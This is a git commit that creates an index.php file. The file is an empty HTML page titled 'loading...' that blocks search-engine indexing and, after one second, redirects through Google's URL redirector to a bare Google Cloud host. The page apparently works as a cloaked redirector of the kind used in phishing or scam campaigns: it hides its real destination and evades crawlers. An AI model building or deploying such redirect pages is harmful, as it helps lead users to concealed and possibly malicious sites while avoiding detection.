1c5fa2859b017fab0d31f34caa43a62cbd5d901e
taniacampilongo <95259810+taniacampilongo@users.noreply.github.com>
2021-11-29 21:48:38 -0400

    Create index.php

---
+++ index.php
@@ -0,0 +1,13 @@
+<html>
+<head>
+<title>loading...</title>
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="robots" content="noindex, nofollow">
+<meta name="Googlebot-News" content="noindex, nofollow">
+<meta name="googlebot" content="noindex, nofollow">
+<meta name="robots" content="noimageindex">
+<META HTTP-EQUIV="REFRESH" CONTENT="1;URL=https://www.google.com/url?q=http://1.23.223.35.bc.googleusercontent.com/&sa=D&source=hangouts&ust=1638254940605000&usg=AOvVaw1OitPSAKdOKMd309nja_HP">
+</head>
+<body>
+</body>
+</html>
